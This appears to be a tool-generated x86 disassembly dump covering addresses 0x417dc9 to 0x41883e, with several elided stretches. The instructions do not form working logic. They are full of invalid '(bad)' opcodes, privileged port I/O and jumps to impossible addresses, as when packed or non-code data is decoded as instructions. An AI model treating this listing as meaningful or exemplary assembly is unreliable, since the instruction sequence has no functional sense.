  417dc9:	cwde   
  417dca:	add    al,0xa9
  417dcc:	cmp    ah,BYTE PTR es:[ecx-0x11df46fe]
  417dd3:	pushf  
  417dd4:	adc    esp,eax
  417dd6:	xor    DWORD PTR [edi],esp
  417dd8:	nop
  417dd9:	ins    DWORD PTR es:[edi],dx
  417dda:	pop    ebp
  417ddb:	sbb    edi,edi
  417ddd:	imul   BYTE PTR [eax+0x18]
  417de0:	pop    edx
  417de1:	ret    
  417de2:	fmul   st(7),st
  417de4:	mov    ds:0x336802a1,al
  417de9:	dec    esp
  417dea:	sub    esp,esi
  417dec:	inc    ebx
	...
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	shl    edi,1
  417e64:	shl    BYTE PTR [ecx],0x3d
  417e67:	add    DWORD PTR [ecx],eax
  417e69:	add    bh,bh
  417e6b:	add    BYTE PTR [eax],al
  417e6d:	add    al,cl
  417e6f:	add    BYTE PTR [eax],0x1a
  417e72:	sbb    ebp,ebp
  417e74:	and    eax,0x4f5489fe
  417e79:	or     esi,ebx
  417e7b:	mov    ds:0x8092bd0c,eax
  417e80:	mov    bh,0x30
  417e82:	push   edx
  417e83:	cmp    eax,0x82009824
  417e88:	dec    edi
  417e89:	mov    dh,0x51
  417e8b:	mov    ecx,0xee26e17b
  417e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e91:	mov    edi,0x19435560
  417e96:	mov    ?,WORD PTR [eax]
  417e98:	fsubr  QWORD PTR [ebp+0x65]
  417e9b:	xchg   DWORD PTR [eax],eax
  417e9d:	jl     0x417ea3
  417e9f:	(bad)  
  417ea0:	aam    0x3a
  417ea2:	shl    DWORD PTR [edx-0x60],0xfc
  417ea6:	mov    dh,0x8a
  417ea8:	or     edx,ebx
  417eaa:	mov    edx,0xdcaff8e7
  417eaf:	std    
  417eb0:	into   
  417eb1:	shr    DWORD PTR [eax+0xa],1
  417eb4:	mov    ebx,0xb78381cf
  417eb9:	pop    ebp
  417eba:	bound  ebx,QWORD PTR [eax+0xe]
  417ebd:	sub    BYTE PTR [ebx-0xe],al
  417ec0:	push   ss
  417ec1:	add    BYTE PTR [ebp-0x66415464],0x48
  417ec8:	out    0x79,eax
  417eca:	pop    ds
  417ecb:	pusha  
  417ecc:	add    ebx,0xb26f026f
  417ed2:	push   ds
  417ed3:	in     eax,dx
  417ed4:	jns    0x417ec2
  417ed6:	in     eax,dx
  417ed7:	out    dx,eax
  417ed8:	push   0xa9ed5839
  417edd:	pusha  
  417ede:	inc    edx
  417edf:	push   ebx
  417ee0:	push   cs
  417ee1:	ds xchg ecx,eax
  417ee3:	hlt    
  417ee4:	out    0x74,al
  417ee6:	and    DWORD PTR [edx],ecx
  417ee8:	cwde   
  417ee9:	div    DWORD PTR [ebx+eax*8+0x7439a829]
  417ef0:	cmp    al,0x94
  417ef2:	add    BYTE PTR [eax+0xb],ah
  417ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ef6:	rol    DWORD PTR [ebp-0x3],cl
  417ef9:	add    dl,dl
  417efb:	jmp    0x3cecbd82
  417f00:	sar    DWORD PTR [ecx-0x198bd1f4],cl
  417f06:	fucomi st,st(3)
  417f08:	sbb    DWORD PTR [esi],esp
  417f0a:	mov    eax,ds:0x6d4c75d4
  417f0f:	fdiv   st(6),st
  417f11:	or     DWORD PTR [eax],ebp
  417f13:	mov    ds:0xc945905,al
  417f18:	pop    ebx
  417f19:	sbb    esp,DWORD PTR [eax]
  417f1b:	outs   dx,DWORD PTR ds:[esi]
  417f1c:	xor    ch,BYTE PTR [ecx]
  417f1e:	test   al,0x52
  417f20:	mov    dh,bl
  417f22:	jge    0x417ee0
  417f24:	pop    edx
  417f25:	test   DWORD PTR [eax-0xa441bb3],ebp
  417f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f2c:	push   0xbee19d9f
  417f31:	push   edx
  417f32:	and    al,0x2d
  417f34:	popf   
  417f35:	popf   
  417f36:	push   esi
  417f37:	add    edi,esi
  417f39:	out    0xc6,al
  417f3b:	or     eax,0x489e8605
  417f40:	fldcw  WORD PTR [esi+0x22aca2c9]
  417f46:	xchg   edi,eax
  417f47:	lods   eax,DWORD PTR ds:[esi]
  417f48:	lock dec edx
  417f4a:	fild   DWORD PTR [eax+0x2a3ff2fb]
  417f50:	add    DWORD PTR [ebp+ecx*4-0x4919daab],edi
  417f57:	mov    ah,0x9f
  417f59:	in     al,dx
  417f5a:	mov    ecx,0x1462f338
  417f5f:	cmc    
  417f60:	pop    edx
  417f61:	push   esi
  417f62:	jg     0x417f30
  417f64:	cli    
  417f65:	mov    eax,ds:0x8ac5c7a6
  417f6a:	xor    al,0x9b
  417f6c:	les    eax,FWORD PTR [eax]
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	push   ebx
  417fe3:	xor    DWORD PTR [edi+0x1023c43],edx
  417fe9:	add    bh,bh
  417feb:	add    BYTE PTR [eax],al
  417fed:	add    BYTE PTR [edx+0x54946b66],dh
  417ff3:	mov    eax,fs
  417ff5:	fidivr DWORD PTR [edx]
  417ff7:	stos   BYTE PTR es:[edi],al
  417ff8:	xor    ebx,DWORD PTR [eax+0x32]
  417ffb:	imul   DWORD PTR [edx-0x43e7d284]
  418001:	sub    dh,dl
  418003:	out    0xc8,al
  418005:	test   BYTE PTR [eax+0x691ae806],0xb5
  41800c:	gs mov dl,0x1e
  41800f:	sbb    esp,ebx
  418011:	ja     0x418001
  418013:	lods   eax,DWORD PTR ds:[esi]
  418014:	xlat   BYTE PTR ds:[ebx]
  418015:	ror    esi,1
  418017:	dec    ecx
  418018:	inc    esp
  418019:	outs   dx,BYTE PTR gs:[esi]
  41801b:	mov    eax,ds:0x606a2ea1
  418020:	daa    
  418021:	xchg   al,cl
  418023:	inc    ecx
  418024:	push   es
  418025:	push   ss
  418026:	dec    ebx
  418027:	jl     0x4180a6
  418029:	and    DWORD PTR [ebx-0x2b],ebx
  41802c:	aam    0x8a
  41802e:	mov    WORD PTR [eax+ebp*8],?
  418031:	fild   DWORD PTR [eax+eax*8-0x21cc1b42]
  418038:	inc    edi
  418039:	jl     0x418001
  41803b:	lock mov al,0x84
  41803e:	sahf   
  41803f:	mov    es,WORD PTR [ecx]
  418041:	call   0x77a54504
  418046:	dec    edx
  418047:	add    ch,cl
  418049:	popa   
  41804a:	push   cs
  41804b:	sbb    BYTE PTR [esi],0x2d
  41804e:	scas   eax,DWORD PTR es:[edi]
  41804f:	fnstcw WORD PTR [esi+0x19]
  418052:	xchg   ebx,eax
  418053:	aaa    
  418054:	push   esi
  418055:	imul   BYTE PTR [eax-0x28]
  418058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418059:	xchg   esi,eax
  41805a:	pop    eax
  41805b:	push   es
  41805c:	inc    ch
  41805e:	pop    ebp
  41805f:	and    DWORD PTR [edi-0x499b10c3],eax
  418065:	jp     0x418046
  418067:	adc    edx,ebp
  418069:	push   cs
  41806a:	jle    0x418049
  41806c:	ror    DWORD PTR [esi+eiz*2+0x26],cl
  418070:	and    DWORD PTR [ecx],edx
  418072:	inc    ax
  418074:	mov    WORD PTR [esi-0x7d],?
  418077:	arpl   WORD PTR [edi-0xc],di
  41807a:	xchg   BYTE PTR [ebx],ch
  41807c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41807d:	test   eax,0x730268ab
  418082:	das    
  418083:	pop    edx
  418084:	xchg   ebp,eax
  418085:	adc    cl,ah
  418087:	xlat   BYTE PTR ds:[ebx]
  418088:	inc    edi
  418089:	dec    eax
  41808a:	add    cl,BYTE PTR [esi+0x1d]
  41808d:	xor    dh,ch
  41808f:	add    al,0xf8
  418091:	cmp    dl,BYTE PTR [ebx+ebx*8]
  418094:	shl    ecx,0xb
  418097:	loope  0x418102
  418099:	ret    
  41809a:	push   0xeeaaab6a
  41809f:	test   eax,0x6099cf0d
  4180a4:	and    BYTE PTR [ebx],0x96
  4180a7:	scas   eax,DWORD PTR es:[edi]
  4180a8:	test   al,0x29
  4180aa:	xchg   esi,eax
  4180ab:	pop    esi
  4180ac:	mov    ch,BYTE PTR [edi+0x3b3b4cf5]
  4180b2:	nop    DWORD PTR [ebx+0x8262a62]
  4180b9:	shr    BYTE PTR [ebx],cl
  4180bb:	mov    ebp,0x376b6f79
  4180c0:	leave  
  4180c1:	sbb    eax,0x4d530aab
  4180c6:	push   es
  4180c7:	ficom  WORD PTR [eax-0x6af3dfc2]
  4180cd:	out    dx,al
  4180ce:	into   
  4180cf:	mov    al,ds:0x28a7ba32
  4180d4:	xchg   ebx,eax
  4180d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d6:	cmp    edx,esp
  4180d8:	dec    ebx
  4180d9:	test   eax,0x94f2cd86
  4180de:	ja     0x41814f
  4180e0:	adc    DWORD PTR [edi+0x42],0x6c681410
  4180e7:	push   ebx
  4180e8:	xchg   edi,eax
  4180e9:	xor    ebx,edi
  4180eb:	jo     0x418143
	...
  418155:	add    BYTE PTR [ecx-0xba9482],ch
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x672fdebc,eax
  418163:	add    BYTE PTR [eax+0x1033b62],0x0
  41816a:	inc    DWORD PTR [eax]
  41816c:	add    BYTE PTR [eax],al
  41816e:	dec    ecx
  41816f:	push   ebx
  418170:	cmc    
  418171:	jmp    0x4181ac
  418173:	xchg   esi,eax
  418174:	mov    ch,0x48
  418176:	jbe    0x4181f3
  418178:	dec    ecx
  418179:	les    edi,FWORD PTR [edx+ecx*8+0x3fc10841]
  418180:	(bad)  
  418181:	mov    esp,0xd8e0674d
  418186:	mov    esi,0xcde0c0dc
  41818b:	mov    ecx,ebx
  41818d:	or     DWORD PTR [eax+0x4e4db3ff],edx
  418193:	xchg   edx,eax
  418194:	mov    ecx,0x4defb743
  418199:	xlat   BYTE PTR ds:[ebx]
  41819a:	out    dx,eax
  41819b:	jb     0x4181cd
  41819d:	lds    eax,FWORD PTR [edx-0x68]
  4181a0:	cmp    BYTE PTR gs:[edi-0x34e5b87c],cl
  4181a7:	lock mov ah,dh
  4181aa:	repz dec esp
  4181ac:	and    al,0x92
  4181ae:	pop    es
  4181af:	call   0x3829eca6
  4181b4:	int    0xf4
  4181b6:	popa   
  4181b7:	in     al,dx
  4181b8:	push   ebp
  4181b9:	fcomp  DWORD PTR [ebx-0x31]
  4181bc:	sbb    al,0xff
  4181be:	sbb    bl,BYTE PTR [edi]
  4181c0:	fstp   DWORD PTR [ecx-0x584555f1]
  4181c6:	pop    es
  4181c7:	mov    cl,BYTE PTR [ecx]
  4181c9:	data16 lods al,BYTE PTR ds:[esi]
  4181cb:	lahf   
  4181cc:	push   0x97a390e4
  4181d1:	(bad)  
  4181d2:	push   ecx
  4181d3:	call   0xdfff:0x80e06fad
  4181da:	mov    ecx,0xdaf17c7
  4181df:	or     al,0xbe
  4181e1:	cmp    eax,0x3402588f
  4181e6:	sub    dh,BYTE PTR [edx+0x7801fe8d]
  4181ec:	jns    0x418251
  4181ee:	daa    
  4181ef:	stos   DWORD PTR es:[edi],eax
  4181f0:	xor    eax,0x46335bbe
  4181f5:	in     al,0xdf
  4181f7:	shl    DWORD PTR [esi+0x2a],1
  4181fa:	dec    edx
  4181fb:	push   ebx
  4181fc:	push   ecx
  4181fd:	icebp  
  4181fe:	sbb    DWORD PTR [ebx-0x743a0b5d],esi
  418204:	dec    ebp
  418205:	ret    0x3c3a
  418208:	lods   eax,DWORD PTR ds:[esi]
  418209:	cmp    BYTE PTR [eax-0x178f91ec],bh
  41820f:	push   esi
  418210:	cwde   
  418211:	in     eax,0xc7
  418213:	stc    
  418214:	sbb    bh,BYTE PTR [edx]
  418216:	mov    eax,ds:0x9b6963c9
  41821b:	(bad)  
  41821c:	dec    edi
  41821d:	pusha  
  41821e:	xlat   BYTE PTR cs:[ebx]
  418220:	mov    ds:0x316f4b19,eax
  418225:	dec    esp
  418226:	jge    0x41821f
  418228:	jns    0x4181d7
  41822a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822b:	daa    
  41822c:	ja     0x418202
  41822e:	push   ecx
  41822f:	xchg   ebx,eax
  418230:	cmp    BYTE PTR [esp+ebx*4+0x4b],0x70
  418235:	xchg   ebx,eax
  418236:	in     al,0x3e
  418238:	stos   DWORD PTR es:[edi],eax
  418239:	mov    esi,0xf8c8b67
  41823e:	repnz add ecx,DWORD PTR ss:[ebx]
  418242:	add    dh,BYTE PTR [ecx+0x381f0c0a]
  418248:	push   0xc50123c1
  41824d:	(bad)  
  41824e:	cwde   
  41824f:	push   edx
  418250:	mov    ds:0x37ad4223,eax
  418255:	adc    eax,0xc4c5f552
  41825a:	aam    0x61
  41825c:	xor    ecx,ecx
  41825e:	cmp    edi,DWORD PTR [ecx-0x496551f8]
  418264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418265:	sbb    BYTE PTR [eax+0x7bf49923],al
  41826b:	or     BYTE PTR [edx+0x0],dl
	...
  4182d6:	aaa    
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x3d6b8d6
  4182e4:	and    BYTE PTR [edx+0x1043a],dl
  4182ea:	inc    DWORD PTR [eax]
  4182ec:	add    BYTE PTR [eax],al
  4182ee:	push   edx
  4182ef:	jge    0x418307
  4182f1:	xchg   ebp,eax
  4182f2:	out    dx,eax
  4182f3:	mov    edx,0x480584d4
  4182f8:	mov    WORD PTR [ebx],?
  4182fa:	sub    eax,0x7dd50d60
  4182ff:	and    ebp,ecx
  418301:	push   es
  418302:	mov    BYTE PTR [ebx+0x4e],ah
  418305:	mov    BYTE PTR [esi-0x5e17567],bl
  41830b:	repz (bad) 
  41830d:	mov    edx,0x371e810e
  418312:	div    BYTE PTR [edi]
  418314:	sub    BYTE PTR [esi-0x24],bh
  418317:	cmp    al,0xda
  418319:	out    0xe4,eax
  41831b:	sbb    DWORD PTR [ecx-0x24684fa7],0xffffffbc
  418322:	mov    WORD PTR [bx+si+0x74a7],ds
  418327:	or     eax,0x63b959a4
  41832c:	push   cx
  41832e:	mov    ds:0x516b9ca9,eax
  418333:	push   cs
  418334:	mov    ecx,0xb0df8de3
  418339:	int    0x1
  41833b:	lahf   
  41833c:	xchg   ebp,eax
  41833d:	mov    bl,cl
  41833f:	sbb    edi,esi
  418341:	or     BYTE PTR [eax-0x6e],bh
  418344:	sub    ebx,DWORD PTR [ebp-0x46]
  418347:	xor    esp,DWORD PTR [edx]
  418349:	inc    esi
  41834a:	outs   dx,BYTE PTR ds:[esi]
  41834b:	out    0x5e,eax
  41834d:	pop    ebp
  41834e:	and    eax,0x51a374bf
  418353:	pop    es
  418354:	ins    BYTE PTR es:[edi],dx
  418355:	sub    al,0x79
  418357:	or     eax,0x5a34b27a
  41835c:	jae    0x418348
  41835e:	das    
  41835f:	adc    edi,ebx
  418361:	xor    dl,BYTE PTR [ebx+0x72]
  418364:	push   edx
  418365:	adc    BYTE PTR [esi-0x140ca17d],bl
  41836b:	or     DWORD PTR [eax],0xffffffb5
  41836e:	data16 sbb al,0x56
  418371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418372:	(bad)  
  418373:	dec    esp
  418374:	dec    eax
  418375:	retf   0xb450
  418378:	jnp    0x418336
  41837a:	mov    ah,0x1d
  41837c:	aaa    
  41837d:	inc    eax
  41837e:	inc    ebx
  41837f:	out    0x53,eax
  418381:	jecxz  0x41839a
  418383:	cmp    DWORD PTR [eax-0x30],ebp
  418386:	mov    dh,0xe
  418388:	mov    ebx,0x4454b301
  41838d:	xchg   esp,eax
  41838e:	aas    
  41838f:	push   es
  418390:	sub    esi,ecx
  418392:	(bad)  
  418393:	pop    edx
  418394:	repz imul ecx,ecx,0x39ee261e
  41839b:	enter  0x3cc6,0x88
  41839f:	xlat   BYTE PTR ds:[ebx]
  4183a0:	inc    esi
  4183a1:	xchg   edi,eax
  4183a2:	jb     0x4183e0
  4183a4:	pop    edx
  4183a5:	cld    
  4183a6:	push   0xd85a0673
  4183ab:	mov    ecx,ds
  4183ad:	jge    0x418361
  4183af:	and    edx,esi
  4183b1:	mov    ah,0xb2
  4183b3:	loope  0x41835d
  4183b5:	mov    ebx,0xdd447f0b
  4183ba:	pop    esp
  4183bb:	test   ecx,esi
  4183bd:	xchg   esp,eax
  4183be:	les    ecx,FWORD PTR [edx+0x692fa704]
  4183c4:	add    al,0x52
  4183c6:	ret    
  4183c7:	push   es
  4183c8:	js     0x4183a2
  4183ca:	stos   DWORD PTR es:[edi],eax
  4183cb:	fwait
  4183cc:	je     0x418389
  4183ce:	sub    eax,0x55333966
  4183d3:	jnp    0x418379
  4183d5:	sub    bh,BYTE PTR [ecx+edi*4+0x38]
  4183d9:	mov    ebp,0x5353196a
  4183de:	sub    DWORD PTR [esi],esp
  4183e0:	lahf   
  4183e1:	das    
  4183e2:	adc    BYTE PTR [ebp-0x3cf84503],cl
  4183e8:	add    ebp,DWORD PTR [edx+0x2]
  4183eb:	dec    ebx
  4183ec:	les    eax,FWORD PTR [eax]
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	mov    al,ds:0x39dd54f7
  418467:	add    eax,0xff0001
  41846c:	add    BYTE PTR [eax],al
  41846e:	test   DWORD PTR [edi-0x1f],edi
  418471:	mov    edx,0xad1c78ce
  418476:	retf   
  418477:	cmc    
  418478:	jp     0x4184b1
  41847a:	mov    esi,0xa8b64029
  41847f:	adc    al,0xa
  418481:	xlat   BYTE PTR ds:[ebx]
  418482:	mov    bh,0xf1
  418484:	nop
  418485:	and    BYTE PTR [ebp-0x47],ch
  418488:	aaa    
  418489:	mov    ebp,DWORD PTR [edi]
  41848b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41848c:	mov    ds:0xfb7cc50c,eax
  418491:	sbb    BYTE PTR [ecx],dh
  418493:	and    bl,BYTE PTR [esp+ecx*2-0x6bcf386c]
  41849a:	dec    eax
  41849b:	iret   
  41849c:	and    DWORD PTR [esi+0x68],edx
  41849f:	adc    bl,bl
  4184a1:	iret   
  4184a2:	xor    eax,0x12234945
  4184a7:	mov    ebx,0x9c4c192d
  4184ac:	ret    0xde8a
  4184af:	shr    BYTE PTR [esi],cl
  4184b1:	pushf  
  4184b2:	push   ebx
  4184b3:	pminsw mm3,QWORD PTR [edx]
  4184b6:	xor    cl,BYTE PTR [edi]
  4184b8:	and    DWORD PTR [eax],eax
  4184ba:	popf   
  4184bb:	mov    al,0x2b
  4184bd:	cdq    
  4184be:	sub    edx,DWORD PTR ds:0x48e72355
  4184c4:	stc    
  4184c5:	pop    ebx
  4184c6:	jmp    0x41847b
  4184c8:	xchg   edx,eax
  4184c9:	mov    ?,WORD PTR [edx+0x1259bbfa]
  4184cf:	bound  esp,QWORD PTR [ecx-0x5a]
  4184d2:	xor    BYTE PTR [ebp+0x21e11aa9],ch
  4184d8:	adc    DWORD PTR [ebx-0x2f],ebp
  4184db:	jg     0x4184fc
  4184dd:	adc    al,0x6e
  4184df:	stos   DWORD PTR es:[edi],eax
  4184e0:	add    eax,0xebf23044
  4184e5:	lahf   
  4184e6:	jp     0x418553
  4184e8:	jmp    0x8e8b:0x98986bf2
  4184ef:	cmp    ah,ch
  4184f1:	test   eax,0x712ba78a
  4184f6:	inc    esi
  4184f7:	cdq    
  4184f8:	(bad)  
  4184f9:	jg     0x4184e4
  4184fb:	fcom   DWORD PTR [edx]
  4184fd:	out    dx,al
  4184fe:	rol    ebx,0x9b
  418501:	test   BYTE PTR [esp+eiz*4+0x1f458d49],ch
  418508:	or     DWORD PTR [ebp-0x4c],0x564cf2a8
  41850f:	xchg   DWORD PTR [esi+0x6abb709c],esi
  418515:	pop    eax
  418516:	adc    bl,BYTE PTR [edx-0x23e4f756]
  41851c:	mov    ecx,0x830afb7
  418521:	addr16 mov bl,0x8d
  418524:	in     eax,0x3d
  418526:	xlat   BYTE PTR ds:[ebx]
  418527:	out    0xd7,eax
  418529:	mov    ebp,0x6ce23d0d
  41852e:	xor    al,0xde
  418530:	arpl   WORD PTR [ebx],di
  418532:	icebp  
  418533:	mov    ebx,0x1f6eee76
  418538:	lods   eax,DWORD PTR ds:[esi]
  418539:	shl    edx,0x37
  41853c:	mov    bl,0x1d
  41853e:	scas   eax,DWORD PTR es:[edi]
  41853f:	sub    DWORD PTR [ebx],edx
  418541:	shr    DWORD PTR [edi+0x2b],0x87
  418545:	rep stos BYTE PTR es:[edi],al
  418547:	push   es
  418548:	f2xm1  
  41854a:	dec    esp
  41854b:	jecxz  0x4184e6
  41854d:	cmp    eax,0x36e9b0c3
  418552:	repnz mov ecx,0x4aef095
  418558:	cmp    ebp,ebp
  41855a:	inc    ebp
  41855b:	cld    
  41855c:	shr    DWORD PTR [eax-0x37],cl
  41855f:	pusha  
  418560:	sub    eax,0xe8215190
  418565:	xchg   esi,esp
  418567:	out    0x3c,al
  418569:	fwait
  41856a:	inc    eax
  41856b:	jl     0x41852e
	...
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	pop    es
  4185e3:	cdq    
  4185e4:	das    
  4185e5:	xor    BYTE PTR [eax],bh
  4185e7:	push   es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	inc    DWORD PTR [eax]
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	out    0xf1,eax
  4185f0:	pusha  
  4185f1:	add    ah,0x1f
  4185f4:	(bad)  
  4185f5:	pop    ds
  4185f6:	dec    edx
  4185f7:	xchg   ecx,eax
  4185f8:	or     ebx,DWORD PTR [eax+0x3287cb74]
  4185fe:	out    dx,eax
  4185ff:	es retf 0x67c9
  418603:	mov    eax,0x947f1a93
  418608:	cli    
  418609:	ret    0xce43
  41860c:	push   ebx
  41860d:	dec    ebp
  41860e:	inc    ebx
  41860f:	sar    DWORD PTR [esi+edi*1],0x40
  418613:	lahf   
  418614:	leave  
  418615:	in     eax,dx
  418616:	or     al,0x6c
  418618:	sub    eax,0x283da3ac
  41861d:	xor    ebp,DWORD PTR [esi-0x44d36eaf]
  418623:	xor    DWORD PTR [ebx+0x66],edi
  418626:	aas    
  418627:	test   al,0xac
  418629:	lods   al,BYTE PTR ds:[esi]
  41862a:	push   esp
  41862c:	gs enter 0xad2b,0xc1
  418631:	fwait
  418632:	out    0xa3,eax
  418634:	xchg   esp,eax
  418635:	inc    edi
  418636:	mov    al,0xe2
  418638:	and    BYTE PTR [esi-0x4cbe0f32],dl
  41863e:	sub    BYTE PTR [edi-0x4],ah
  418641:	sbb    al,0x7e
  418643:	adc    eax,0x9a11e585
  418648:	dec    edx
  418649:	sub    al,0x59
  41864b:	sub    ebx,DWORD PTR [ecx+0x2be04a8d]
  418651:	inc    ecx
  418652:	xor    al,BYTE PTR [edi+0x298bba66]
  418658:	cmp    ebp,0xffffffed
  41865b:	lods   eax,DWORD PTR ds:[esi]
  41865c:	jp     0x418654
  41865e:	adc    BYTE PTR [ebx+0x64],ch
  418661:	xchg   ebp,eax
  418662:	arpl   WORD PTR [edx+0x48],di
  418665:	add    BYTE PTR [edi+0x7c],0x9c
  418669:	loop   0x41860f
  41866b:	push   edi
  41866c:	aaa    
  41866d:	lahf   
  41866e:	mov    BYTE PTR [edi+0x7492f0a],0x8
  418675:	test   BYTE PTR [ebx],0xb1
  418678:	jae    0x418652
  41867a:	fiadd  WORD PTR [ebx]
  41867c:	lods   eax,DWORD PTR ds:[esi]
  41867d:	outs   dx,BYTE PTR ds:[esi]
  41867e:	lods   eax,DWORD PTR ds:[esi]
  41867f:	out    0x1f,eax
  418681:	adc    DWORD PTR [ecx-0x29],edx
  418684:	cmp    cl,BYTE PTR [eax+ecx*2-0x6e]
  418688:	or     dl,bl
  41868a:	in     al,dx
  41868b:	fs add edx,edx
  41868e:	mov    dh,0x8f
  418690:	mov    eax,ds:0xbf39c88e
  418695:	sub    DWORD PTR [edi+eax*8],ebx
  418698:	arpl   di,bx
  41869a:	push   ss
  41869b:	data16 jno 0x4186c3
  41869e:	xchg   edi,eax
  41869f:	push   ecx
  4186a0:	sub    DWORD PTR [esi+ebp*4+0x246583fc],0xffffffbf
  4186a8:	mov    WORD PTR [ebx],?
  4186aa:	xor    eax,DWORD PTR [esi+eax*2+0x58]
  4186ae:	adc    al,0xb
  4186b0:	or     al,0x43
  4186b2:	and    DWORD PTR cs:[eax+esi*4+0x6e7d14c6],ebx
  4186ba:	mov    ds:0xeb76c862,eax
  4186bf:	mov    eax,ds:0xbe8fd44e
  4186c4:	and    ebx,edx
  4186c6:	sbb    al,0x53
  4186c8:	jl     0x4186c0
  4186ca:	sub    eax,0x3340808b
  4186cf:	adc    al,0x5b
  4186d1:	das    
  4186d2:	push   ebx
  4186d3:	jae    0x418695
  4186d5:	in     eax,0xbc
  4186d7:	ins    BYTE PTR es:[edi],dx
  4186d8:	inc    eax
  4186d9:	mov    DWORD PTR [ecx],ecx
  4186db:	outs   dx,BYTE PTR ds:[esi]
  4186dc:	mov    dl,0xad
  4186de:	(bad)  
  4186e0:	dec    ecx
  4186e1:	cmp    eax,0xfda733f9
  4186e6:	scas   al,BYTE PTR es:[edi]
  4186e7:	pop    esi
  4186e8:	stos   DWORD PTR es:[edi],eax
  4186e9:	mov    ebp,0xb3d578
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	sar    BYTE PTR [edx],1
  418764:	out    dx,eax
  418765:	aaa    
  418766:	aaa    
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	inc    DWORD PTR [eax]
  41876c:	add    BYTE PTR [eax],al
  41876e:	inc    ebp
  41876f:	xchg   ecx,eax
  418770:	adc    BYTE PTR [eax],bl
  418772:	xor    dh,BYTE PTR [edi]
  418774:	fisubr WORD PTR [edi+0x2c]
  418777:	sub    ch,dl
  418779:	ins    BYTE PTR es:[edi],dx
  41877a:	jmp    0x418738
  41877c:	jnp    0x418707
  41877e:	sahf   
  41877f:	addr16 nop
  418781:	mov    cl,0xd4
  418783:	call   FWORD PTR [ebx-0x35]
  418786:	xor    cl,BYTE PTR [esi+0x7ea0cd8c]
  41878c:	and    eax,0x3246d1d8
  418791:	in     eax,0x1c
  418793:	inc    ebp
  418794:	sbb    BYTE PTR [ecx],0x1e
  418797:	imul   esi,DWORD PTR ds:0x19a8a991,0x19
  41879e:	add    dh,BYTE PTR [edx-0x4e]
  4187a1:	jo     0x418736
  4187a3:	add    eax,DWORD PTR [esi-0x51]
  4187a6:	push   es
  4187a7:	leave  
  4187a8:	test   DWORD PTR [eax-0x3e],0x74ab8358
  4187af:	adc    ah,BYTE PTR gs:[edx+0x6700da52]
  4187b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b7:	(bad)  [edi-0x1e35db4e]
  4187bd:	mov    al,BYTE PTR [edx]
  4187bf:	mov    edi,0x64b01617
  4187c4:	pop    ss
  4187c5:	adc    ch,BYTE PTR [ecx-0x924582d]
  4187cb:	pop    eax
  4187cc:	test   al,0xa0
  4187ce:	inc    edx
  4187cf:	sub    eax,0xa7cb40f0
  4187d4:	push   ebp
  4187d5:	mov    DWORD PTR [edx-0x3],ecx
  4187d8:	dec    esp
  4187d9:	ins    BYTE PTR es:[edi],dx
  4187da:	sub    al,0xf0
  4187dc:	mov    ch,BYTE PTR [esi]
  4187de:	data16 jb 0x418813
  4187e1:	out    dx,al
  4187e2:	stos   DWORD PTR es:[edi],eax
  4187e3:	cmp    BYTE PTR [ebx],bl
  4187e5:	dec    edx
  4187e6:	inc    ebx
  4187e7:	sar    DWORD PTR [eax],0x26
  4187ea:	push   cs
  4187eb:	lfs    esi,FWORD PTR [ebx+0x6c]
  4187ef:	xchg   edi,eax
  4187f0:	fucomp st(1)
  4187f2:	sub    DWORD PTR [edx],eax
  4187f4:	dec    eax
  4187f5:	xchg   ecx,eax
  4187f6:	xor    BYTE PTR [ebp+0x422f2c6f],cl
  4187fc:	into   
  4187fd:	pop    ss
  4187fe:	xchg   BYTE PTR [eax+esi*4+0x4db89a],ah
  418805:	ret    0xea8a
  418808:	(bad)  
  418809:	frstor [edi+0x46]
  41880c:	fdiv   QWORD PTR [eax]
  41880e:	and    dl,BYTE PTR [edi-0x2838f331]
  418814:	repnz (bad) 
  418816:	es out 0x7d,eax
  418819:	pop    ss
  41881a:	mov    esp,0x91a39f1b
  41881f:	push   ebp
  418820:	dec    esi
  418821:	sub    edi,ebx
  418823:	and    dh,BYTE PTR [edi+0x5bec769d]
  418829:	jnp    0x4187f9
  41882b:	enter  0x7f5b,0x82
  41882f:	pop    edi
  418830:	pop    ebx
  418831:	mov    ah,0xd0
  418833:	add    eax,0xc378b0e5
  418838:	mov    ah,0xc1
  41883a:	add    al,0xdb
  41883c:	adc    al,0x45
  41883e:	sbb    BYTE PTR ds:0x173194bd,bh
